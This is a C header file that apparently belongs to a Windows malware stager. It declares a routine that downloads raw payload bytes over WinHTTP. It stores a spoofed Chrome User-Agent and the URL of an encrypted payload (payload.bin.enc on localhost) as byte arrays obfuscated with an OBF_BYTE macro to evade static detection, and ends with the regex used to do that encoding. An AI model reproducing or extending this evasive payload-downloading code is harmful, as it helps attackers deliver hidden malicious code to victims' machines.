#pragma once

#include "my_kernel32.h"
#include "my_library_utils.h" // for DecodeString() 
#include "my_winhttp.h"
#include <windows.h>
#include <winhttp.h>

// Function Declarations
unsigned char *DownloadRawBytes(DWORD *outSize);

// Obfuscated User-Agent
static const unsigned char s_UserAgent[] = {OBF_BYTE('M'), OBF_BYTE('o'), OBF_BYTE('z'), OBF_BYTE('i'), OBF_BYTE('l'), OBF_BYTE('l'), OBF_BYTE('a'), OBF_BYTE('/'), OBF_BYTE('5'), OBF_BYTE('.'), OBF_BYTE('0'), OBF_BYTE(' '), OBF_BYTE('('), OBF_BYTE('W'), OBF_BYTE('i'), OBF_BYTE('n'), OBF_BYTE('d'), OBF_BYTE('o'), OBF_BYTE('w'), OBF_BYTE('s'), OBF_BYTE(' '), OBF_BYTE('N'), OBF_BYTE('T'), OBF_BYTE(' '), OBF_BYTE('1'), OBF_BYTE('0'), OBF_BYTE('.'), OBF_BYTE('0'), OBF_BYTE(';'), OBF_BYTE(' '), OBF_BYTE('W'), OBF_BYTE('i'), OBF_BYTE('n'), OBF_BYTE('6'), OBF_BYTE('4'), OBF_BYTE(';'), OBF_BYTE(' '),
                                            OBF_BYTE('x'), OBF_BYTE('6'), OBF_BYTE('4'), OBF_BYTE(')'), OBF_BYTE(' '), OBF_BYTE('A'), OBF_BYTE('p'), OBF_BYTE('p'), OBF_BYTE('l'), OBF_BYTE('e'), OBF_BYTE('W'), OBF_BYTE('e'), OBF_BYTE('b'), OBF_BYTE('K'), OBF_BYTE('i'), OBF_BYTE('t'), OBF_BYTE('/'), OBF_BYTE('5'), OBF_BYTE('3'), OBF_BYTE('7'), OBF_BYTE('.'), OBF_BYTE('3'), OBF_BYTE('6'), OBF_BYTE(' '), OBF_BYTE('('), OBF_BYTE('K'), OBF_BYTE('H'), OBF_BYTE('T'), OBF_BYTE('M'), OBF_BYTE('L'), OBF_BYTE(','), OBF_BYTE(' '), OBF_BYTE('l'), OBF_BYTE('i'), OBF_BYTE('k'), OBF_BYTE('e'), OBF_BYTE(' '),
                                            OBF_BYTE('G'), OBF_BYTE('e'), OBF_BYTE('c'), OBF_BYTE('o'), OBF_BYTE(')'), OBF_BYTE(' '), OBF_BYTE('C'), OBF_BYTE('h'), OBF_BYTE('r'), OBF_BYTE('o'), OBF_BYTE('m'), OBF_BYTE('e'), OBF_BYTE('/'), OBF_BYTE('1'), OBF_BYTE('1'), OBF_BYTE('2'), OBF_BYTE('.'), OBF_BYTE('0'), OBF_BYTE('.'), OBF_BYTE('0'), OBF_BYTE('.'), OBF_BYTE('0'), OBF_BYTE(' '), OBF_BYTE('S'), OBF_BYTE('a'), OBF_BYTE('f'), OBF_BYTE('a'), OBF_BYTE('r'), OBF_BYTE('i'), OBF_BYTE('/'), OBF_BYTE('5'), OBF_BYTE('3'), OBF_BYTE('7'), OBF_BYTE('.'), OBF_BYTE('3'), OBF_BYTE('6'), 0};

// Obfuscated URL http://127.0.0.1:8000/payload.bin.enc
static const unsigned char s_Url[] = {OBF_BYTE('h'), OBF_BYTE('t'), OBF_BYTE('t'), OBF_BYTE('p'), OBF_BYTE(':'), OBF_BYTE('/'), OBF_BYTE('/'), OBF_BYTE('1'), OBF_BYTE('2'), OBF_BYTE('7'), OBF_BYTE('.'), OBF_BYTE('0'), OBF_BYTE('.'), OBF_BYTE('0'), OBF_BYTE('.'), OBF_BYTE('1'), OBF_BYTE(':'), OBF_BYTE('8'), OBF_BYTE('0'), OBF_BYTE('0'), OBF_BYTE('0'), OBF_BYTE('/'), OBF_BYTE('p'), OBF_BYTE('a'), OBF_BYTE('y'), OBF_BYTE('l'), OBF_BYTE('o'), OBF_BYTE('a'), OBF_BYTE('d'), OBF_BYTE('.'), OBF_BYTE('b'), OBF_BYTE('i'), OBF_BYTE('n'), OBF_BYTE('.'), OBF_BYTE('e'), OBF_BYTE('n'), OBF_BYTE('c')};


// find:     (.)
// replace:  OBF_BYTE('$1'), 

